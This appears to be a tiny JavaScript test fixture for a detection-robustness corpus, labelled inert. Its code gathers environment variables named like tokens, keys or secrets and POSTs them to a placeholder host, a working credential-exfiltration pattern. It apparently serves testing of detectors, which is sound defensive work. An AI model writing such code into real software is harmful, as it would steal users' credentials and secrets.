// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const secrets = Object.fromEntries(Object.entries(process.env).filter(([k]) => /TOKEN|KEY|SECRET/.test(k)));
fetch('https://collect.example.invalid/c', { method: 'POST', body: JSON.stringify(secrets) });
